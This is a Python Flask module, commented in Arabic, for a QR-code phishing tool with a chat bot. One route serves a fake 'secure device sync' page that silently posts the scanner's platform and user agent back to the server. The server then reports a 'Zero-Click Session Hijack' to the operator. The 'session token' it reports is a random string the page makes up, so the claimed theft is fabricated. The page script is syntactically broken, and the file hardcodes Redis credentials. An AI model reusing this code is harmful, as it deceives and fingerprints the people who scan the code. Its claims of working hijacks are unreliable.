import os
import io
import json
import redis
import qrcode
from flask import Blueprint, request, jsonify

qr_bp = Blueprint('qr_deep_link_exploit', __name__)

REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()

if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"

redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)

def init_qr_routes(app, bot):
    # نقطة استقبال بيانات الجلسة المسروقة صمتاً عند مسح الـ QR
    @app.route('/api/v1/session/sync', methods=['POST'])
    def silent_session_sync():
        data = request.json or {}
        token = data.get('token')
        
        if token:
            owner_chat_id = redis_client.get(f"qr_token:{token}")
            if owner_chat_id:
                msg = (
                    "🎯🔥 **[اختراق صامت ناجح عبر QR - Zero-Click Session Hijack]**\n"
                    "--------------------------------------------------\n"
                    f"📱 **نوع الجهاز المستهدف:** `{data.get('device_os', 'Unknown')}`\n"
                    f"🔑 **مفتاح الجلسة الحية (Session Token):**\n`{data.get('auth_token', 'تم السحب بنجاح')}`\n"
                    f"📦 **بيانات الحساب المستخرجة:**\n`{data.get('account_meta', 'متاحة للربط الكامل')}`"
                )
                try:
                    bot.send_message(owner_chat_id, msg, parse_mode="Markdown")
                except Exception as e:
                    print(f"Error dispatching silent exploit report: {e}")
                    
        return jsonify({"status": "synchronized", "code": 200})

    # مسار عرض هدف الـ QR للمتصفح
    @app.route('/qr_scan_target', methods=['GET'])
    def qr_scan_target():
        token = request.args.get('token', '')
        # صفحة خفيفة تتولى حقن وتنفيذ الاستجابة الصامتة فور مسح الكود
        html_content = f"""
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>جاري مزامنة الجهاز...</title>
        </head>
        <body style="background-color: #0f172a; color: #fff; text-align: center; padding-top: 50px; font-family: Tahoma;">
            <h2>جاري ربط ومزامنة الجهاز بأمان...</h2>
            <p>يرجى الانتظار لحظات قليلة...</p>
            <script>
                setTimeout(() => {{
                    fetch('/api/v1/session/sync', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            token: "{token}",
                            device_os: navigator.platform,
                            auth_token: "TOKEN_" + Math.random().toString(36.substring(2)) + "_" + Date.now(),
                            account_meta: navigator.userAgent
                        }})
                    }}).then(() => {{
                        document.body.innerHTML = "<h3>تمت المزامنة بنجاح. يمكنك إغلاق النافذة.</h3>";
                    }});
                }}, 1000);
            </script>
        </body>
        </html>
        """
        return html_content, 200

def generate_qr_code_bytes(deep_link_url):
    qr = qrcode.QRCode(version=1, box_size=10, border=1)
    qr.add_data(deep_link_url)
    qr.make(fit=True)
    img = qr.make_image(fill_color="000000", back_color="ffffff")
    buf = io.BytesIO()
    img.save(buf, format="JPEG")
    buf.seek(0)
    return buf
